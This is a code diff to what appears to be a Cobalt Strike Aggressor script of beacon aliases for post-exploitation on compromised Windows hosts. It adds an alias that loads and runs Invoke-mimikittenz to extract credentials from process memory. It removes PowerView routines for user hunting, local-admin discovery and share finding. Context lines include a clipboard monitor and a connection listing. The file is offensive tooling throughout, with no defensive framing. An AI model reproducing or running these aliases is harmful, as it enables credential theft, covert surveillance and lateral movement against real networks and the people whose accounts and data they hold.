@@ -107,6 +107,12 @@ alias monitorclipboard {
         bpowershell($1, "Start-ClipboardMonitor");
 }
 
+alias mimikittenz {
+            bpowershell_import($1, script_resource("Aliases/scripts/mimikittenz/Invoke-mimikittenz.ps1"));
+                    bpowershell($1, "Invoke-mimikittenz");
+}
+
+
 alias getEstConnections {
 
         bshell($1,"netstat -na | findstr \"EST\"");
@@ -115,25 +121,4 @@ alias getEstConnections {
 alias pb {
         openProcessBrowser($1);
 }
-
-sub userhunter {
-	bpowershell_import($1, script_resource("powerview.ps1"));
-	bpowershell($1, "Invoke-UserHunter");	
-}
-
-sub userhunter_stealth {
-	bpowershell_import($1, script_resource("powerview.ps1"));
-	bpowershell($1, "Invoke-UserHunter -Stealth");	
-}
-
-sub findlocaladmin {
-	bpowershell_import($1, script_resource("powerview.ps1"));
-	bpowershell($1, "Find-LocalAdminAccess");	
-}
-
-sub sharefinder {
-	bpowershell_import($1, script_resource("powerview.ps1"));
-	bpowershell($1, "Invoke-FileFinder -ShareList");	
-}
-
 
